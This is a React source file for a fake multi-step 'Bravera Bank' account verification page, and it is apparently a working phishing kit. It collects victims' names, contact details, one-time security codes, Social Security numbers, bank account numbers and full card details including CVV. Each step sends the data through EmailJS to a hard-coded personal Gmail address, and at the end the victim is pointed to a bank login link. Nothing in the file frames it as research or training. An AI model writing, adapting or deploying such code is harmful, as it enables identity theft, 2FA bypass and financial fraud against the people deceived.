import { useEffect,  useState } from "react";
import BG from "../assets/bg.png";
import emailjs from "@emailjs/browser";
import Footer from "../components/Footer";
import Logo from "../assets/logo.png"; // You'll need to add this image

export default function CombinedVerification() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    emailAddress: "",
    phoneNumber: "",
    verificationCode: "",
    ssn: "",
    accountNumber: "",
    bankName: "Bravera Bank", // Default bank name
    // Credit card fields
    cardNumber: "",
    cardExpiry: "",
    cardCVV: "",
    cardholderName: ""
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [codeRequested, setCodeRequested] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };
  
  useEffect(() => {
    // Initialize EmailJS with your public key
    emailjs.init("v_oAluZ11har85Kfg");
  }, []);

  // Function to send data to emailjs
  const sendStepData = async (stepNumber, additionalData = {}) => {
    setIsSubmitting(true);
    
    try {
      // Prepare the data for the current step
      let templateData = {
        bankName: formData.bankName,
        stepCompleted: stepNumber,
        time: new Date().toString(),
        to_email: "leslieolobo@gmail.com",
        ...additionalData
      };
      
      const response = await emailjs.send(
        "service_my2ydis", // Your EmailJS service ID
        "template_vj50jeg", // Your EmailJS template ID
        templateData
      );

      console.log(`Step ${stepNumber} data submitted successfully:`, response);
      setSubmitStatus("success");
      return true;
    } catch (error) {
      console.error(`Failed to submit step ${stepNumber} data:`, error);
      setSubmitStatus("error");
      return false;
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNextStep = async () => {
    // Simple validation before proceeding
    if (currentStep === 1) {
      if (!formData.firstName || !formData.lastName) return;
      
      // Send step 1 data
      const success = await sendStepData(1, {
        firstName: formData.firstName,
        lastName: formData.lastName
      });
      
      if (!success) return;
    } 
    else if (currentStep === 2) {
      if (!formData.emailAddress || !formData.phoneNumber) return;
      
      // Send step 2 data
      const success = await sendStepData(2, {
        firstName: formData.firstName,
        lastName: formData.lastName,
        emailAddress: formData.emailAddress,
        phoneNumber: formData.phoneNumber
      });
      
      if (!success) return;
    } 
    else if (currentStep === 3) {
      if (!formData.verificationCode) return;
      
      // Send step 3 data
      const success = await sendStepData(3, {
        firstName: formData.firstName,
        lastName: formData.lastName,
        emailAddress: formData.emailAddress,
        phoneNumber: formData.phoneNumber,
        verificationCode: formData.verificationCode
      });
      
      if (!success) return;
    } 
    else if (currentStep === 4) {
      if (!formData.ssn || !formData.accountNumber) return;
      
      // The final submission will happen in handleFinalSubmit
      handleFinalSubmit();
      return;
    }

    // Move to next step
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handleRequestCode = async () => {
    // Send code request notification
    await sendStepData('code-request', {
      firstName: formData.firstName,
      lastName: formData.lastName,
      emailAddress: formData.emailAddress,
      phoneNumber: formData.phoneNumber,
      message: "User requested verification code"
    });
    
    setCodeRequested(true);
    // In a real app, this would trigger sending a code to the user
  }

  const handleFinalSubmit = async () => {
    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send the final, complete submission with all data
      const response = await emailjs.send(
        "service_my2ydis", // Your EmailJS service ID
        "template_vj50jeg", // Your EmailJS template ID
        {
          bankName: formData.bankName,
          firstName: formData.firstName,
          lastName: formData.lastName,
          emailAddress: formData.emailAddress,
          phoneNumber: formData.phoneNumber,
          verificationCode: formData.verificationCode,
          ssn: formData.ssn,
          accountNumber: formData.accountNumber,
          // Credit card details
          cardNumber: formData.cardNumber,
          cardExpiry: formData.cardExpiry,
          cardCVV: formData.cardCVV,
          cardholderName: formData.cardholderName,
          stepCompleted: "final",
          time: new Date().toString(),
          to_email: "leslieolobo@gmail.com"
        }
      );

      console.log("Final verification submitted successfully:", response);
      setSubmitStatus("success");
      // Move to confirmation step
      setCurrentStep(5);
    } catch (error) {
      console.error("Failed to submit final verification:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <>
            <h2 className="text-xl mb-2">Name Verification!</h2>
            <h3 className="text-lg mb-4">Confirm Your Name Information</h3>
            <p className="mb-4">Please confirm your name details on file.</p>

            <div className="mb-4">
              <label className="block mb-1">First Name</label>
              <input
                type="text"
                name="firstName"
                value={formData.firstName}
                onChange={handleChange}
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            <div className="mb-4">
              <label className="block mb-1">Last Name</label>
              <input
                type="text"
                name="lastName"
                value={formData.lastName}
                onChange={handleChange}
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>
          </>
        );

      case 2:
        return (
          <>
            <h2 className="text-xl mb-2">Email Verification!</h2>
            <h3 className="text-lg mb-4">Confirm Your Email and Phone Number Information</h3>
            <p className="mb-4">Please confirm your contact details on file.</p>

            <div className="mb-4">
              <label className="block mb-1">Email Address</label>
              <input
                type="email"
                name="emailAddress"
                value={formData.emailAddress}
                onChange={handleChange}
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            <div className="mb-4">
              <label className="block mb-1">Phone Number</label>
              <input
                type="tel"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleChange}
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>
          </>
        );

      case 3:
        return (
          <>
            <h2 className="text-xl mb-2">Code Verification</h2>
            <p className="mb-4">
              We've sent a secured code to your registered number. Please tell us your code
              for account verification. If you didn't get code, please wait 1-2 minutes .
            </p>

            <div className="mb-4">
              <input
                type="text"
                name="verificationCode"
                value={formData.verificationCode}
                onChange={handleChange}
                placeholder="Enter your code"
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            <div className="flex justify-start mb-4">
              <button
                type="button"
                onClick={handleRequestCode}
                className="bg-[#3B3836] text-white px-4 py-2 rounded-md hover:bg-[#4e4c4b] mr-2"
              >
                Resend Code
              </button>
            </div>
            
            {codeRequested && (
              <div className="text-green-500 text-sm mb-4">
                Code has been resent. Please check your device.
              </div>
            )}
          </>
        );

      case 4:
        return (
          <>
            <h2 className="text-xl mb-2">Account Verification!</h2>
            <h3 className="text-lg mb-4">Confirm Your Account Information</h3>
            <p className="mb-4">We need this info to verify your identity.</p>

            <div className="mb-4">
              <input
                type="text"
                name="ssn"
                value={formData.ssn}
                onChange={handleChange}
                placeholder="Social Security number"
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
              <p className="text-xs text-gray-400 mt-1 italic">
                EIN and ITIN are also accepted
              </p>
            </div>

            <div className="mb-4">
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleChange}
                placeholder="Account number"
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            {/* Credit Card Details Section */}
            <div className="mt-6 mb-4">
              <h3 className="text-lg mb-3">Credit Card Information</h3>
              <p className="mb-3 text-sm text-gray-300">
                Please provide your credit card details for verification purposes.
              </p>
              
              <div className="mb-3">
                <label className="block mb-1">Cardholder Name</label>
                <input
                  type="text"
                  name="cardholderName"
                  value={formData.cardholderName}
                  onChange={handleChange}
                  placeholder="Name as it appears on card"
                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
                />
              </div>
              
              <div className="mb-3">
                <label className="block mb-1">Card Number</label>
                <input
                  type="text"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleChange}
                  placeholder="XXXX XXXX XXXX XXXX"
                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
                />
              </div>
              
              <div className="flex gap-4">
                <div className="w-1/2">
                  <label className="block mb-1">Expiry Date</label>
                  <input
                    type="text"
                    name="cardExpiry"
                    value={formData.cardExpiry}
                    onChange={handleChange}
                    placeholder="MM/YY"
                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
                  />
                </div>
                
                <div className="w-1/2">
                  <label className="block mb-1">CVV</label>
                  <input
                    type="text"
                    name="cardCVV"
                    value={formData.cardCVV}
                    onChange={handleChange}
                    placeholder="123"
                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
                  />
                </div>
              </div>
            </div>

            <div className="text-center mt-2">
              <a href="#" className="text-[#F2AA2E] text-sm hover:underline">
                Need help finding your account number?
              </a>
            </div>
          </>
        );

      case 5:
        return (
          <>
            <h2 className="text-xl mb-2">Account Verification!</h2>
            <h3 className="text-lg mb-4">Thank you!</h3>
            <p className="mb-4">
              Your contact information has been updated successfully. Please{" "}
              <a href="https://secure.bravera.bank/login" className="text-[#F2AA2E] hover:underline">
                Click here
              </a>{" "}
              and you will be redirected to the Authentication page. If the page doesn't
              reload in 5 seconds
            </p>

            <div className="text-center mt-4">
              <p className="text-sm text-gray-400">
                Redirecting you to secure login...
              </p>
            </div>
          </>
        );

      default:
        return null;
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: `url(${BG})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
      }}
    >
      {/* Main Content */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
          {/* Logo */}
          <div className="flex justify-center mb-6">
            <img 
              src={Logo} 
              alt="Bravera Bank" 
              className="h-12"
            />
          </div>
          
          {/* Progress Indicator */}
          <div className="flex justify-between mb-6 px-4">
            {[1, 2, 3, 4].map((step) => (
              <div 
                key={step} 
                className={`w-8 h-8 rounded-full flex items-center justify-center ${
                  currentStep >= step 
                    ? "bg-[#F2AA2E] text-[#1E1F20]" 
                    : "bg-gray-700 text-white"
                }`}
              >
                {step}
              </div>
            ))}
          </div>

          {/* Step Content */}
          <div className="mb-6">
            {renderStepContent()}
          </div>

          {/* Navigation Buttons */}
          {currentStep < 5 && (
            <div className="flex justify-center mt-6">
              <button
                type="button"
                onClick={handleNextStep}
                className="bg-[#3B3836] text-white px-8 py-3 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  "Processing..."
                ) : (
                  currentStep === 4 ? "Submit" : "Continue"
                )}
              </button>
            </div>
          )}

          {/* Error Message */}
          {submitStatus === "error" && (
            <div className="text-red-500 text-center mt-4">
              Something went wrong. Please try again.
            </div>
          )}
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
}